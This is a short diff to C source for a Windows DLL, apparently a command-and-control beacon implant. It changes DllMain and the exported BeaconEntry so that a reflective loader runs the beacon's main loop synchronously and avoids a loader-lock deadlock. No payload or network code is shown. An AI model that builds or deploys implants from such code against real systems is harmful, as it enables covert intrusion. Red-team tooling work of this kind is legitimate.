@@ -151,10 +151,14 @@ static DWORD WINAPI ObStart(LPVOID unused) {
  * may also call the exported BeaconEntry directly. */
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
 	switch (reason) {
-		case DLL_PROCESS_ATTACH:
 		case 4:
-			ObStart(NULL);
+			/* official semantics: the loader calls DllMain(4) on a sacrificial
+			 * thread and the beacon RUNS SYNCHRONOUSLY on it (never start the
+			 * main loop thread from DllMain - the loader lock deadlocks
+			 * WSAStartup/heap init on the new thread) */
+			ObMain(NULL);
 			return TRUE;
+		case DLL_PROCESS_ATTACH:
 		case DLL_PROCESS_DETACH:
 		default:
 			return TRUE;
@@ -249,5 +253,5 @@ void BeaconErrorPrintf(int error, char* fmt, ...) {
 }
 
 __declspec(dllexport) void __cdecl BeaconEntry(LPVOID lpReserved) {
-	ObStart(NULL);
+	ObMain(NULL);
 }
